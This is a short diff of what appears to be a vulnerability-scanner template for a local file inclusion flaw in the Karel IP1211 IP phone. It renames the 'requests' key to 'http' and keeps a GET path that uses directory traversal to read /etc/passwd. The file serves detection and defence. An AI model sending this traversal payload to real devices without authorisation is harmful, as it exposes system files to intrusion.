@@ -10,7 +10,7 @@ info:
     - https://www.karel.com.tr/urun-cozum/ip1211-ip-telefon
   tags: karel,lfi
 
-requests:
+http:
   - method: GET
     path:
       - "{{BaseURL}}/cgi-bin/cgiServer.exx?page=../../../../../../../../../../../etc/passwd"
